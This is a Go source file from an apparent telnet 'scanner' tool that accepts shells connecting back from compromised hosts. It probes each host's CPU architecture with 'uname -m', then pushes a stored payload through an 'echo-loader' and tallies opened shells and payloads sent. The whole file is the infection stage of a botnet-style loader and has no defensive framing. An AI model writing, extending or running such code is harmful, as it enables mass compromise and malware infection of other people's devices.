package telnet

import (
	"bufio"
	"fmt"
	"net"
	"net/textproto"
	"scanner/components/utils"
	"strings"
	"time"
)

func NewTelnetSession(socket net.Conn) *Session {
	S := Session{
		Socket:    socket,
		Connected: false,
	}

	fmt.Printf("[Telnet] New shell from %s\n", socket.RemoteAddr().String())
	return &S
}

// Todo: Handle multiple line input
func (s *Session) Input() (bool, string) {
	content := ""

	for s.Connected && content == "" {
		data, err := textproto.NewReader(bufio.NewReader(s.Socket)).ReadLine()

		if err != nil {
			s.Connected = false
			return false, content
		}

		content = strings.TrimSpace(string(data))
	}

	return true, content
}

func (S *Session) HandleConnection() {
	for i := 0; i < 10; i++ {
		if _, ok := utils.SocketList[strings.Split(S.Socket.RemoteAddr().String(), ":")[0]]; ok {
			S.Connected = true
			break
		}

		time.Sleep(1 * time.Second)
	}

	if !S.Connected {
		fmt.Printf("[Telnet] %s disconnected (reason=timeout_socket_input)\n", S.Socket.RemoteAddr().String())
		return
	}

	fmt.Printf("[Telnet] %s Shell etablished\n", S.Socket.RemoteAddr().String())
	utils.ShellOpened++

	utils.SocketList[strings.Split(S.Socket.RemoteAddr().String(), ":")[0]].Write([]byte("uname -m\n"))

	success, arch := S.Input()
	if !success {
		S.Connected = false
		fmt.Printf("[Telnet] %s disconnected, running echo-loader (reason=timeout_socket_input)\n", S.Socket.RemoteAddr().String())
		utils.SocketList[strings.Split(S.Socket.RemoteAddr().String(), ":")[0]].Write([]byte(fmt.Sprintf("%s\n", utils.Payload)))
		return
	}
	fmt.Printf("[Telnet] %s arch: %s\n", S.Socket.RemoteAddr().String(), arch)

	utils.SocketList[strings.Split(S.Socket.RemoteAddr().String(), ":")[0]].Write([]byte(fmt.Sprintf("%s\n", utils.Payload)))
	fmt.Printf("[Telnet] %s Payload sent!\n", S.Socket.RemoteAddr().String())
	utils.PayloadSent++

	// Close the connection
	S.Socket.Close()
	utils.SocketList[strings.Split(S.Socket.RemoteAddr().String(), ":")[0]].Close()
	delete(utils.SocketList, strings.Split(S.Socket.RemoteAddr().String(), ":")[0])
}